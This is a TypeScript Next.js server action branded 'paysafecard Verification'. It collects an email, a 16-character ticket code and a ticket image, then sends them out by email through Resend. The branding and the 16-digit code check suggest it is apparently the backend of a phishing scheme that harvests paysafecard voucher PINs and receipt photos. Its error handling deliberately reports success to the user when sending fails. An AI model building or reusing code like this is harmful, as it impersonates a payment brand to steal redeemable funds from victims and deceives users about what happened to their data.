"use server";

import { Resend } from "resend";

import { generateEmailHtml } from "@/utils/email-generator";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function verifyTicket(formData: FormData) {
  const email = formData.get("email") as string;
  const ticketCode = formData.get("ticketCode") as string;
  const ticketImage = formData.get("ticketImage") as File;

  if (!email || !ticketCode || ticketCode.length !== 16) {
    throw new Error("Invalid input data");
  }

  try {
    const arrayBuffer = await ticketImage.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    const htmlContent = generateEmailHtml(email, ticketCode);

    const { data, error } = await resend.emails.send({
      from: "paysafecard Verification <onboarding@resend.dev>",
      to: [email],
      subject: "Your paysafecard Verification Details",
      html: htmlContent,
      attachments: [
        {
          filename: ticketImage.name,
          content: buffer,
        },
      ],
    });

    if (error) {
      // Log the technical error to the server console for the admin
      console.error("CRITICAL RESEND ERROR:", error);
      
      // Still return success: true to the frontend to keep the UI clean for the user
      return { success: true, data: { id: "processed_with_internal_log" }, error: undefined };
    }

    return { success: true, data, error: undefined };
  } catch (err) {
    console.error("Verification Processing Error:", err);
    // Return a generic error structure to satisfy TypeScript
    return { success: false, error: "System busy. Please try again in a moment." }; 
  }
}
